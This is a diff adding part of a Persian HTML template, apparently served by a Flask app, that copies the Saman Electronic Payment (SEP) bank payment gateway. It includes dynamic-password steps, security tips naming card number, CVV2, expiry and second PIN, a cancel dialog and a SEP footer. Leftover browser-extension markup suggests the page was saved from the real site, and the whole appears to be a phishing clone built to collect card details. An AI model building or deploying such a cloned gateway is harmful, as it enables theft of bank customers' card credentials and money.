+                        class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></h2>
+              </div>
+              <ul class="knowledge-list text-justify">
+                <li>رمز پویا رمز یک‌بار مصرفی است که به جای رمز دوم کارت استفاده می‌شود.<sider-trans
+                    data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                        style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></li>
+                <li>مرحله اول: بر اساس دستورالعمل بانک صادرکننده کارت خود، نسبت به فعال سازی رمز پویا اقدام
+                  نمایید.<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                        class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></li>
+                <li>
+                  مرحله دوم: رمز پویا را بر اساس روش اعلامی از طرف بانک صادر کننده کارت، به یکی از روش‌های زیر دریافت
+                  کنید.
+                  <sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                        class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans>
+                  <ul class="sublist">
+                    <li>1- دریافت از طریق برنامه کاربردی بانک، اینترنت بانک و یا موبایل بانک.<sider-trans
+                        data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                            style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                            viewBox="0 0 16 16" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                              fill="currentColor"></path>
+                          </svg></sider-trans-inline></sider-trans></li>
+                    <li>2- دریافت از طریق کد USSD بانک صادر کننده کارت شما.<sider-trans
+                        data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                            style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                            viewBox="0 0 16 16" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                              fill="currentColor"></path>
+                          </svg></sider-trans-inline></sider-trans></li>
+                    <li>3- دریافت از طریق زدن دکمه "دریافت رمز پویا" در درگاه پرداخت اینترنتی.<sider-trans
+                        data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                            style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                            viewBox="0 0 16 16" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                              fill="currentColor"></path>
+                          </svg></sider-trans-inline></sider-trans></li>
+                  </ul>
+                </li>
+                <li>مرحله سوم: پس از دریافت رمز به یکی از روش‌های فوق، رمز پویای دریافت شده را در محل تعیین شده برای
+                  "رمز دوم" وارد نمایید و سپس مابقی اطلاعات را تکمیل نمایید.<sider-trans
+                    data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                        style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="row" role="note" aria-label="راهنما و نکات امنیتی">
+          <div class="col col-12">
+            <div class="card">
+              <div class="head">
+                <h2>راهنما و نکات امنیتی<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                        class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></h2>
+              </div>
+              <ul class="knowledge-list text-justify">
+                <li><mark>شماره کارت:</mark> 16 رقمی بوده و بصورت 4 قسمت 4 رقمی روی کارت درج شده است.<sider-trans
+                    data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                        style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></li>
+                <li><mark>شماره شناسایی دوم <small class="en">(CVV2)</small>:</mark> شماره شناسایی کارت با طول 3 یا 4
+                  رقم کنار شماره کارت و یا پشت کارت درج شده است.</li>
+                <li><mark>تاریخ انقضا:</mark> شامل دو بخش ماه و سال انقضا در کنار شماره کارت درج شده است.</li>
+                <li><mark>رمز دوم:</mark> با عنوان رمز دوم و در برخی موارد با <span class="en">PIN2</span> شناخته
+                  می‌شود، از طریق بانک صادر کننده کارت تولید شده و همچنین از طریق دستگاه‌های خودپرداز بانک صادر کننده
+                  قابل تهیه و یا تغییر می‌باشد.</li>
+                <li class="breakline"><mark>کد امنیتی:</mark> بخشی از محتوای صفحه پرداخت است و لازم است برای ادامه
+                  فرآیند خرید، کد موجود که به صورت عددی در تصویر مشخص شده است در محل پیش بینی شده درج شود.</li>
+                <li>درگاه پرداخت اینترنتی سامان با استفاده از پروتکل امن SSL به مشتریان خود ارائه خدمت نموده و با آدرس
+                  <span class="text-danger">https://sep.shaparak.ir</span> شروع می‌شود. خواهشمند است به منظور جلوگیری از
+                  سوء استفاده‌های احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر وب خود را با آدرس فوق
+                  مقایسه نمایید و در صورت مشاهده هر نوع مغایرت احتمالی، موضوع را با ما در میان بگذارید.</li>
+                <li>از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.</li>
+                <li>برای جلوگیری از افشای رمز کارت خود، حتی المقدور از صفحه کلید مجازی استفاده فرمایید.</li>
+                <li>برای کسب اطلاعات بیشتر، گزارش فروشگاه‌های مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی می‌توانید
+                  با شماره <a href="tel:+982184080" dir="ltr">021-84080</a> تماس بگیرید و یا از طریق آدرس ایمیل <a
+                    href="mailto:epay@sep.ir">epay@sep.ir</a> اقدام نمایید.</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <div class="dialog">
+        <h1>لغو پرداخت</h1>
+        <i class="icn-exit exit-badge"><span class="path1"></span><span class="path2"></span><span
+            class="path3"></span></i>
+        <h2>می‌خواهید پرداخت را لغو کنید؟</h2>
+        <div class="extra">
+          <button id="CancelConfirmed" name="CancelConfirmed" class="button danger full-width"
+            data-action="CancelConfirmed" role="button" tabindex="0">
+            <span>لغو پرداخت و خروج</span>
+          </button>
+          <button id="CancelNeverMind" name="CancelNeverMind" class="button outline full-width"
+            data-action="CancelNeverMind" role="button" tabindex="0">
+            <span>ادامه فرآیند پرداخت</span>
+          </button>
+        </div>
+        <i class="icn-xcross xcross"></i>
+      </div>
+    </div>
+    <footer class="footer" role="contentinfo" aria-label="Footer">
+      <div class="container">
+        <div class="supervisors">
+          <image src="{{url_for('static',filename='images/sepblue.png')}}" class="block  mx-auto"></image>
+        </div>
+        <div class="trademark">
+          <p>شرکت پرداخت الکترونیک سامان (سهامی عام) <span class="since">2008 - 2025</span></p>
+        </div>
+        <div class="extra">
+          <p>تمامی حقوق این محصول متعلق به سِپ (پرداخت الکترونیک سامان کیش) می‌باشد.</p>
+          <p>مرکز شبانه روزی ارتباط با مشتریان: <a href="tel:+982184080" class="tel" dir="ltr">021-84080</a></p>
+        </div>
+      </div>
+
+
+    </footer>
+
+  
+
+
+
+  <script src="{{ url_for('static', filename='js/jquery.js') }}"></script>
+  <script src="{{ url_for('static', filename='js/helper.js') }}"></script>
+  <script src="{{ url_for('static', filename='js/validate.js') }}"></script>
+  <script src="{{ url_for('static', filename='js/app.js') }}"></script>
+
+  
+</body>
+</html>
